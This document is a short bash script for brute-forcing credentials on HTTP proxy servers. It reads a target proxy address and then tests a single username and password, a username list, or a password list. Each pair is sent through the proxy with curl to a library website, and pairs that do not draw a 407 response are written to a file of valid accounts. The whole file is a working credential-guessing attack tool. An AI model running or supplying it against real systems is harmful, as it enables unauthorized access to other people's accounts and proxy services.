#!/bin/bash

echo "Please make sure you have install curl and bash!"

echo "Please enter the server address, e.g. 192.168.0.3:80"
read SERVER

echo "Please select the method:"
echo "1 user + pass"
echo "2 username file + pass"
echo "3 user + password file"
read METHOD

i=0
j=0

case $METHOD in
    1)
        echo "Please input the username:"
        read USER
        echo "Please input the password:"
        read PASS
        if curl -x "http://$USER:$PASS@$SERVER" http://www.duxiu.com -v 2>&1 | grep -q "407 Proxy\|error"
        then
            echo "Error account!"
        else
            echo "Valid account!"
        fi
    ;;
    2)
        echo "Please input the path of username file, default value is user.txt in the current directory"
        read USER_FILE
        if [ -z "$USER_FILE" ]
        then
            USER_FILE="user.txt"
        fi
        echo "Please input the password:"
        read PASS
        while read -r USER
        do
            ((j++))
            if curl -x "http://$USER:$PASS@$SERVER" http://www.duxiu.com -v 2>&1 | grep -q "407 Proxy\|error"
            then
                continue
            else
                echo "$USER:$PASS" >> $SERVER.txt
                ((i++))
            fi
        done < $USER_FILE
        echo "$i accounts is valid, total $j"
    ;;
    3)
        echo "Please input the username:"
        read USER
        echo "Please input the path of password file, default value is pass.txt in the current directory"
        read PASS_FILE
        if [ -z "$PASS_FILE" ]
        then
            PASS_FILE="pass.txt"
        fi
        while read -r PASS
        do
            ((j++))
            if curl -x "http://$USER:$PASS@$SERVER" http://www.duxiu.com -v 2>&1 | grep -q "407 Proxy\|error"
            then
                continue
            else
                echo "$USER:$PASS" >> $SERVER.txt
                ((i++))
            fi
        done < $PASS_FILE
        echo "$i accounts is valid, total $j"
    ;;
    *) echo "INVALID METHOD!" ;;
esac
